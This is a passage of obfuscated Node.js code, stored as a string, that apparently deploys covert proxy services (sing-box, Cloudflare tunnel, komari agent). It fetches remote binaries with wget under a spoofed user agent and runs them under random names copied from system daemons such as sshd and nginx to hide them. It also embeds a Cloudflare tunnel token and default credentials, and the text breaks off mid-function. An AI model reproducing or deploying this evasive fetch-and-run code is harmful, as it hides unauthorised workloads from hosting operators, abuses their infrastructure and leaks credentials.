const b = 'const _0xb4759a=_0x7cbb;(function(_0x2e0ff2,_0x2e6eb1){const _0x4a6ce3=_0x7cbb,_0x334ac7=_0x2e0ff2();while(!![]){try{const _0x1762b8=parseInt(_0x4a6ce3(0x1ce))/0x1+-parseInt(_0x4a6ce3(0x1bb))/0x2+-parseInt(_0x4a6ce3(0x15e))/0x3+-parseInt(_0x4a6ce3(0x201))/0x4*(parseInt(_0x4a6ce3(0x1e1))/0x5)+parseInt(_0x4a6ce3(0x1e0))/0x6*(-parseInt(_0x4a6ce3(0x1db))/0x7)+parseInt(_0x4a6ce3(0x1a4))/0x8*(parseInt(_0x4a6ce3(0x168))/0x9)+-parseInt(_0x4a6ce3(0x1d0))/0xa*(-parseInt(_0x4a6ce3(0x175))/0xb);if(_0x1762b8===_0x2e6eb1)break;else _0x334ac7['push'](_0x334ac7['shift']());}catch(_0x554a35){_0x334ac7['push'](_0x334ac7['shift']());}}}(_0x2f58,0x367a2));const http=require('http'),https=require(_0xb4759a(0x1a0)),fs=require('fs'),path=require(_0xb4759a(0x1fe)),os=require('os'),{spawn,exec}=require('child_process'),crypto=require('crypto'),express=require(_0xb4759a(0x192)),{createProxyMiddleware}=require(_0xb4759a(0x186)),CONFIG={'C_T':process[_0xb4759a(0x172)][_0xb4759a(0x215)]||_0xb4759a(0x1ad),'B_D':process[_0xb4759a(0x172)][_0xb4759a(0x17c)]||'loc.gov','C_D':process[_0xb4759a(0x172)]['C_D']||_0xb4759a(0x193),'K_S':process[_0xb4759a(0x172)]['K_S']||_0xb4759a(0x156),'K_K':process[_0xb4759a(0x172)]['K_K']||_0xb4759a(0x173),'VMESS_PORT':process['env']['VMESS_PORT']||_0xb4759a(0x211),'HY2_PORT':process[_0xb4759a(0x172)][_0xb4759a(0x1ac)]||process['env'][_0xb4759a(0x194)]||'','REALITY_PORT':process['env'][_0xb4759a(0x17d)]||'','TUIC_PORT':process[_0xb4759a(0x172)][_0xb4759a(0x1d4)]||'','VMESS_UUID':process[_0xb4759a(0x172)][_0xb4759a(0x21e)]||_0xb4759a(0x196),'TUIC_UUID':process[_0xb4759a(0x172)]['TUIC_UUID']||_0xb4759a(0x196),'TUIC_PASSWORD':process[_0xb4759a(0x172)][_0xb4759a(0x199)]||_0xb4759a(0x1a2),'HY2_PASSWORD':process['env']['HY2_PASSWORD']||_0xb4759a(0x1a2),'REALITY_PRIVATE_KEY':process[_0xb4759a(0x172)][_0xb4759a(0x21b)]||'','REALITY_PUBLIC_KEY':process[_0xb4759a(0x172)][_0xb4759a(0x1e3)]||'','HY2_SNI':process[_0xb4759a(0x172)][_0xb4759a(0x1a7)]||'www.bing.com','VMESS_PATH':process['env'][_0xb4759a(0x1eb)]||_0xb4759a(0x1fa),'REALITY_SNI':process[_0xb4759a(0x172)][_0xb4759a(0x179)]||_0xb4759a(0x1e5),'REALITY_SHORT_ID':process[_0xb4759a(0x172)][_0xb4759a(0x17b)]||_0xb4759a(0x14d),'PORT':process['env'][_0xb4759a(0x20a)]||0x1eb4},WORK_DIR=os[_0xb4759a(0x1bc)](),processes=[];let serviceStatus={'singbox':_0xb4759a(0x1d5),'cloudflared':'stopped','komari':_0xb4759a(0x1d5),'http':'stopped'};const HTML_TEMPLATES={'home':_0xb4759a(0x189),'status':(_0x2bf0f5,_0x34c07d)=>_0xb4759a(0x17e)+(serviceStatus[_0xb4759a(0x154)]==='running'?'status-running':_0xb4759a(0x157))+_0xb4759a(0x1bd)+serviceStatus[_0xb4759a(0x154)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0xb4759a(0x1e2)]==='running'?_0xb4759a(0x1a8):'status-stopped')+_0xb4759a(0x160)+serviceStatus[_0xb4759a(0x1e2)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0xb4759a(0x19c)]===_0xb4759a(0x165)?_0xb4759a(0x1a8):_0xb4759a(0x157))+_0xb4759a(0x1d8)+serviceStatus[_0xb4759a(0x19c)]+_0xb4759a(0x155)+(serviceStatus['http']==='running'?'status-running':_0xb4759a(0x157))+_0xb4759a(0x1bf)+serviceStatus['http']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>'+CONFIG[_0xb4759a(0x20a)]+_0xb4759a(0x1e9)+(CONFIG[_0xb4759a(0x1af)]?_0xb4759a(0x1d6)+CONFIG[_0xb4759a(0x1af)]+'</div></div>':'')+_0xb4759a(0x1f4)+(CONFIG[_0xb4759a(0x1ac)]?_0xb4759a(0x1c1)+CONFIG[_0xb4759a(0x1ac)]+'</div></div>':'')+_0xb4759a(0x1f4)+(CONFIG['REALITY_PORT']?_0xb4759a(0x188)+CONFIG[_0xb4759a(0x17d)]+_0xb4759a(0x159):'')+_0xb4759a(0x1f4)+(CONFIG['TUIC_PORT']?_0xb4759a(0x1b7)+CONFIG[_0xb4759a(0x1d4)]+_0xb4759a(0x159):'')+_0xb4759a(0x14e)+_0x2bf0f5+_0xb4759a(0x1aa)+(_0x34c07d[_0xb4759a(0x1f6)]>0x0?_0x34c07d['map'](_0x4d2689=>'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>'+_0x4d2689[_0xb4759a(0x177)]+':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22'+_0x4d2689[_0xb4759a(0x177)][_0xb4759a(0x18e)]()+'\x22>'+_0x4d2689[_0xb4759a(0x1da)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27'+_0x4d2689['url']+_0xb4759a(0x18a)+_0x4d2689[_0xb4759a(0x177)]+_0xb4759a(0x21d))[_0xb4759a(0x1d7)](''):'<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>')+_0xb4759a(0x14c)},COMMON_PROCESS_NAMES=[_0xb4759a(0x1b5),_0xb4759a(0x1d1),'apache2',_0xb4759a(0x1c0),'mysqld','postgres',_0xb4759a(0x16f),_0xb4759a(0x174),'ntpd',_0xb4759a(0x1f8),_0xb4759a(0x1ed),_0xb4759a(0x185),_0xb4759a(0x17f),_0xb4759a(0x1b9),'python','php-fpm',_0xb4759a(0x19b),_0xb4759a(0x195),_0xb4759a(0x1dd),_0xb4759a(0x19f),_0xb4759a(0x21c),_0xb4759a(0x200),_0xb4759a(0x181),_0xb4759a(0x1f3),'syslogd',_0xb4759a(0x205),_0xb4759a(0x1f5),_0xb4759a(0x20f),_0xb4759a(0x166),_0xb4759a(0x1cb),_0xb4759a(0x213)];function getRandomProcessName(){const _0x1b9eb0=_0xb4759a;return COMMON_PROCESS_NAMES[Math[_0x1b9eb0(0x1f1)](Math[_0x1b9eb0(0x214)]()*COMMON_PROCESS_NAMES[_0x1b9eb0(0x1f6)])];}function detectArch(){const _0x3bad26=_0xb4759a,_0x28a281=process['arch'];return _0x28a281===_0x3bad26(0x216)?_0x3bad26(0x153):_0x28a281===_0x3bad26(0x1de)?_0x3bad26(0x1de):(process['exit'](0x1),'');}function _0x2f58(){const _0x4d21e6=['tuic-in','0.0.0.0','size','482958hYwuyz','--disable-auto-update','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','data','warn','C_D','stderr','running','dhclient','443','657uVMRgd','127.0.0.1','--edge-ip-version','listen','vmess','\x22\x20generate\x20reality-keypair','&type=tcp#REALITY','redis-server','home','File\x20is\x20empty:\x20','env','hvvxWSCNNDSG5yYI','memcached','7191547BsPsST','cubic','protocol','cache.db','REALITY_SNI','logFile','REALITY_SHORT_ID','B_D','REALITY_PORT','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','supervisord','https://ipv4.icanhazip.com','logrotate','keys','direct','http://localhost:','rsyslogd','http-proxy-middleware','run','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','\x27).then(()=>alert(\x27Copied\x20','HY2_PASSWORD','vless://','xtls-rprx-vision','toLowerCase','tuic://','http2','pipe','express','huggingface.seav.eu.org','SERVER_PORT','ruby','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','some','get','TUIC_PASSWORD','/status','java','komari','text/html','auto','dockerd','https','SIGTERM','789456','find','45688AAyzpU','google','stdout','HY2_SNI','status-running','tunnel','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','TUIC','HY2_PORT','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjk1NmE2MDYtOTI0Ni00ZTlhLWI3ZjMtZmQwYjhmOGM4ZmVlIiwicyI6Ik9ETmtORGMxTW1RdE56ZGtaaTAwTWpjMUxUZzFPVEF0TVRRMFpHTTVZMk16TldVNCJ9','every','VMESS_PORT','destroy','Hysteria2','writeHead','cf_','readFileSync','sshd','upgrade','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','VMess','node','/health','886476tlyJMV','tmpdir','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','message','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','httpd','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','push','https://github.com/seav1/dl/releases/download/files/cf-arm','toString','block','forEach','all','K_K','Reality','https://github.com/seav1/dl/releases/download/files/ko-arm','polkitd','kill','base64','201717jHAtlS','existsSync','10crquEG','nginx','--url','end','TUIC_PORT','stopped','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','join','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>komari</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','K_S','url','1205442rfUwQb','https://github.com/seav1/dl/releases/download/files/sb','mongod','arm64','unlinkSync','12FypSwz','167705KeaqAi','cloudflared','REALITY_PUBLIC_KEY','ignore','www.microsoft.com','exit','match','\x22\x20&&\x20chmod\x20+x\x20\x22','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','--no-autoupdate','VMESS_PATH','none','crond','error','spawn','File\x20not\x20found:\x20','floor','reality-in','udevd','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','cron','length','\x22\x20check\x20-c\x20\x22','systemd','\x22\x20\x22','/vms','statSync','10s','trim','path','SIGINT','snapd','12NEqWdb','writeFileSync','文件未找到:\x20','killed','dbus-daemon','catch','tuic','cloudflare','http','PORT','--token','TUIC_UUID','randomBytes','&sid=','atd','vless','8001','1.1.1.1','irqbalance','random','C_T','x64','silent','hysteria2','Wget\x20failed:\x20','stringify','REALITY_PRIVATE_KEY','containerd','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','VMESS_UUID','VMESS','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','0123456789abcdef','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','hy2-in','hex','&fp=chrome&pbk=','vmess-in','amd64','singbox','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','https://komari.seav.eu.org','status-stopped','createWriteStream','</div></div>','status'];_0x2f58=function(){return _0x4d21e6;};return _0x2f58();}async function downloadBinary(_0x3c5d47,_0x1f9985){return new Promise((_0x1cb651,_0x46dbde)=>{const _0x5d7a11=_0x7cbb,_0x72a4e6='wget\x20--timeout=120\x20--tries=3\x20--user-agent=\x22Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x22\x20-O\x20\x22'+_0x1f9985+_0x5d7a11(0x1f9)+_0x3c5d47+_0x5d7a11(0x1e8)+_0x1f9985+'\x22';exec(_0x72a4e6,(_0x5dec9a,_0x17d0f8,_0x3402cd)=>{const _0x51ef1f=_0x5d7a11;if(_0x5dec9a)return _0x46dbde(new Error(_0x51ef1f(0x219)+_0x5dec9a[_0x51ef1f(0x1be)]));if(!fs[_0x51ef1f(0x1cf)](_0x1f9985))return _0x46dbde(new Error(_0x51ef1f(0x1f0)+_0x1f9985));const _0x8828a2=fs[_0x51ef1f(0x1fb)](_0x1f9985);if(_0x8828a2[_0x51ef1f(0x15d)]===0x0)return _0x46dbde(new Error(_0x51ef1f(0x171)+_0x1f9985));_0x1cb651();});});}async function getServerIP(){const _0x2d3d9d=_0xb4759a,_0x137db5=require(_0x2d3d9d(0x1a0));return new Promise(_0x1cbcad=>{const _0x5e400e=_0x2d3d9d,_0x2f4771=_0x137db5[_0x5e400e(0x198)](_0x5e400e(0x180),_0x45f5fa=>{const _0x2f7f89=_0x5e400e;let _0x4cacae='';_0x45f5fa['on'](_0x2f7f89(0x161),_0xe6f3de=>_0x4cacae+=_0xe6f3de),_0x45f5fa['on'](_0x2f7f89(0x1d3),()=>_0x1cbcad(_0x4cacae[_0x2f7f89(0x1fd)]()));});_0x2f4771['on']('error',()=>_0x1cbcad(_0x5e400e(0x169))),_0x2f4771['setTimeout'](0x2710,()=>{const _0x189371=_0x5e400e;_0x2f4771[_0x189371(0x1b0)](),_0x1cbcad(_0x189371(0x169));});});}async function startTempTunnel(_0x1f927f,_0x320a83){return new Promise(_0x908e7d=>{const _0x4ae134=_0x7cbb;for(let _0x4c8faa=0x0;_0x4c8faa<0x3;_0x4c8faa++){const _0x10f09c=path[_0x4ae134(0x1d7)](WORK_DIR,_0x4ae134(0x1b3)+crypto[_0x4ae134(0x20d)](0x4)[_0x4ae134(0x1c4)](_0x4ae134(0x150))+'.log'),_0x1a075b=spawn(_0x1f927f,['tunnel',_0x4ae134(0x1ea),_0x4ae134(0x1d2),_0x4ae134(0x184)+_0x320a83],{'stdio':[_0x4ae134(0x1e4),_0x4ae134(0x191),_0x4ae134(0x191)]});processes[_0x4ae134(0x1c2)](_0x1a075b);const _0x2c8517=fs[_0x4ae134(0x158)](_0x10f09c);_0x1a075b[_0x4ae134(0x1a6)][_0x4ae134(0x191)](_0x2c8517),_0x1a075b[_0x4ae134(0x164)]['pipe'](_0x2c8517),serviceStatus[_0x4ae134(0x1e2)]=_0x4ae134(0x165),_0x1a075b['on'](_0x4ae134(0x1ee),()=>{const _0x18eb5d=_0x4ae134;serviceStatus[_0x18eb5d(0x1e2)]=_0x18eb5d(0x1ee);}),_0x1a075b['on'](_0x4ae134(0x1e6),_0x578ef3=>{const 